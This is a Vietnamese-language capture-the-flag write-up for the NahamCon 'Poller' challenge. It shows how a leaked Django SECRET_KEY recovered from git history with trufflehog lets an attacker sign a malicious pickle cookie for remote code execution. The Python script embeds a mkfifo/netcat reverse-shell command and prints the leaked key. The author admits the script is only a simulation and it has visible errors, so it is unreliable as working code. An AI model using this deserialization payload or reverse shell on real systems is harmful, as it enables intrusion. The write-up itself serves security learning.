# nahamcon CTF - Poller

## Description
.....


## Solution

### Review

![theme_poller](https://user-images.githubusercontent.com/71699412/167298257-bf1abc96-05fb-4437-a2b5-2a23dcc696b7.jpg)

Chall cho 1 website có các chứng năng đăng kí, đăng nhập. Sau khi login thì được redirect vào page để bình chọn poll, không có gì nhiều cho đến khi inspect source code ta tìm được đây là 1 open source code project trên github.

![client)_src_code](https://user-images.githubusercontent.com/71699412/167298273-ad5042a5-bb9c-4840-b1a5-5d1b65f357ae.jpg)

https://github.com/congon4tor/poller


git clone về review source-code tìm vulnerablity, đây là python web app được build trên `django`, review 1 hồi thì không có tìm được cái gì là sai sai, cũng không thấy mặt mũi flag, có lẽ mục tiêu là RCE. Vào lại git repository tìm đến mục `History` xem có security issue nào được chỉnh sửa ở history không.
 
 ![history](https://user-images.githubusercontent.com/71699412/167298278-f3a78147-f331-40e3-a3e1-aa46de2c0720.jpg)

Ta tìm thấy lỗi sensitive data expose SECRET_KEY, với SECRET_KEY này ta có thể sign cookies và làm nhiều thứ khác....

![pickcle_src](https://user-images.githubusercontent.com/71699412/167298285-8b6c4cb9-787e-4347-94ff-c675c9912f14.jpg)

Ngoài ra app này dùng pickle để unserialize thẳng từ cookies, rõ ràng đây là lỗi object injection, một lỗi nghiêm trọng có thể dẫn đến RCE, read files,...

### Exploit
Sau khi có SECRET_KEY ta thử tự serialize RCE payload nhưng fail, thử verify bằng SECRET_KEY với cookies của web app thì fail, rõ ràng đây không phải SECRET_KEY đúng, đừng láu táu.

Ta dùng đến tool `trufflehog`, 1 tool giúp scan các app phổ biến tìm senstive data expose như SECRET_KEY hay api key,...

src: https://github.com/trufflesecurity/trufflehog

Sau khi install, can git repository tìm sensitive data với command:
```bash
sudo docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest git https://github.com/congon4tor/poller --debug --trace
```
Ta được results:

![secret_key_results](https://user-images.githubusercontent.com/71699412/167298292-933eefe3-2d96-43c1-9f67-20a69895aec4.jpg)

Ta tìm thấy được 1 SECRET_KEY khác với cái vừa tìm được:
```bash
SECRET_KEY=77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!
````

Thử dùng cái này verify cookies thì success, rõ ràng đây chính là SECRET_KEY của app và ta có thể dùng nó để tự sign cookies.

Như đã nói từ trước, cookies của app này là 1 serialized string object được serialize bằng python pickle module và được unserialize 1 cách insecure, ta sẽ tấn công object injection để đạt được RCE.

python scripts:
```python
import pickle
import os


class RCE:
    def __reduce__(self):
        # import os
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


def verify(cookies, SECRET_KEY, salt):
    try: # mô phỏng thôi, cứ để nó dump error cho dễ debug
        results = loads(cookies, key=SECRET_KEY, serializer=PickleSerializer, salt=salt)
        return "Horray, it's a valid SECRET_KEY, decoded cookies: " + results
    except:
        return 'It\'s not a valid SECRET_KEY'

def sign(SECRET_KEY, salt);
    content['cookies'] = RCE()
    cookies = pickle.dumps(content, key=SECRET_KEY, serializer=PickleSerializer, salt=salt, compress=True)

    return cookies


SECRET_KEY = "77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!"
salt = "django.contrib.sessions.backends.signed_cookies" # default salt thôi
app_cookies = 'UNKNOWN'

if __name__ == '__main__':
    print(verify(app_cookies, SECRET_KEY, salt))
    print(sign(SECRET_KEY, salt))
    
# Code nhằm mục đích mô phỏng vì chall đã đóng, khá chắc là không chạy được, link solution: https://www.youtube.com/watch?v=9j74Wi6daEU
```
Mở tai lên(netcat) và nghe reverse shell dội về thôi!!

**Flag**: ``
